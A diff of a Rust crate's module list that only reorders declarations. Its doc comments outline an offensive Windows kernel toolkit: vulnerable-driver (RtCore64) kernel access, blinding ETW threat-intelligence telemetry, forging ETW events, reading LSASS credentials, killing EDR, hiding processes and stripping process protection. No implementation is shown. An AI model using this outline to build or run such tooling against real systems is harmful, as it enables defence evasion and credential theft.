@@ -54,17 +54,25 @@ use alloc::string::String;
 use alloc::vec::Vec;
 use core::fmt;
 
+/// BYOVD `KernelRw` bootstrap (P2.2 §1) — CODE SHIPPED, NOT LOADED. The driver
+/// IOCTL binding (`ByovdDriver` + `VulnDriverIoctl` + `RtCore64` reference) +
+/// ntoskrnl symbol resolution are real and unit-tested; the driver LOAD step
+/// is operator-side and never runs on this host.
+pub mod byovd;
+/// ETW Deception — event forgery + frequency keeper (Bypass Complete Phase 4).
+/// Forges synthetic ETW events that match real kernel-provider cadence, defeating
+/// frequency/content-based detection when the ETW-TI blind is active.
+pub mod etw_deception;
 /// ETW-TI provider kernel blind — REAL algorithm (P2.2 §2.1). Given a working
 /// `KernelRw`, chases `EtwThreatIntProvRegHandle → provider block → EnableInfo`
 /// and writes `IsEnabled=0`. HVCI-safe (data section). Unit-tested with a mock
 /// KernelRw; the bootstrap (BYOVD/driverless/DMA `KernelRw` impl + symbol
 /// resolution) lands in Part B / the operator's chosen path.
 pub mod etwti;
-/// BYOVD `KernelRw` bootstrap (P2.2 §1) — CODE SHIPPED, NOT LOADED. The driver
-/// IOCTL binding (`ByovdDriver` + `VulnDriverIoctl` + `RtCore64` reference) +
-/// ntoskrnl symbol resolution are real and unit-tested; the driver LOAD step
-/// is operator-side and never runs on this host.
-pub mod byovd;
+/// Network/credential/neutralize kits (P2.2 §2.4/§2.5/§4): `UserModeEdrSilencer`
+/// (WFP rule templates), `KernelLsassReader` (DTB + page-walk shell),
+/// `EdrNeutralizer` (Kill/Freeze/Choke tiers). Algorithm + framework.
+pub mod netsec;
 /// Version-pinned kernel structure offsets + dynamic multi-version probe.
 ///
 /// Provides a table of known EPROCESS offsets for 14 Windows builds
@@ -77,28 +85,20 @@ pub mod byovd;
 /// consume [`offsets::EprocessOffsets`] — getting one wrong is a bugcheck,
 /// so they're centralised + unit-tested here.
 pub mod offsets;
-/// Telemetry neutralization kits (P2.2 §2.2/§2.3): `CallbackNeutralizer`
-/// (Ps*NotifyRoutine ret-stub) + `MiniFilterUnlinker` (RegisteredFilters
-/// unlink). Algorithms over `&dyn KernelRw`; mock-tested.
-pub mod telemetry;
-/// Persistence/protection kits (P2.2 §3): `ProcessHider` (ActiveProcessLinks
-/// unlink), `PplStripper` (Protection.Level zero), `PatchGuardWindow`
-/// (DKOM-window state machine). Mock-tested.
-pub mod persistence;
-/// Network/credential/neutralize kits (P2.2 §2.4/§2.5/§4): `UserModeEdrSilencer`
-/// (WFP rule templates), `KernelLsassReader` (DTB + page-walk shell),
-/// `EdrNeutralizer` (Kill/Freeze/Choke tiers). Algorithm + framework.
-pub mod netsec;
 /// x64 4-level page-table walk (VA→PA) — pure algorithm, host-testable.
 /// Used by netsec (cross-process LSASS read) + win/va_rw (kernel VA read/write).
 pub mod pagewalk;
 /// ntoskrnl pattern scan (byte-signature → RVA) — pure algorithm, host-testable.
 /// The fallback offset resolver for unknown builds.
 pub mod pattern_scan;
-/// ETW Deception — event forgery + frequency keeper (Bypass Complete Phase 4).
-/// Forges synthetic ETW events that match real kernel-provider cadence, defeating
-/// frequency/content-based detection when the ETW-TI blind is active.
-pub mod etw_deception;
+/// Persistence/protection kits (P2.2 §3): `ProcessHider` (ActiveProcessLinks
+/// unlink), `PplStripper` (Protection.Level zero), `PatchGuardWindow`
+/// (DKOM-window state machine). Mock-tested.
+pub mod persistence;
+/// Telemetry neutralization kits (P2.2 §2.2/§2.3): `CallbackNeutralizer`
+/// (Ps*NotifyRoutine ret-stub) + `MiniFilterUnlinker` (RegisteredFilters
+/// unlink). Algorithms over `&dyn KernelRw`; mock-tested.
+pub mod telemetry;
 /// Windows-specific kernel-tier shells (BYOVD/KslD/DMA `KernelRw` impls +
 /// symbol resolution). Empty for now — algorithms live in the sibling modules;
 /// this is where the Windows-only bootstrap lands.
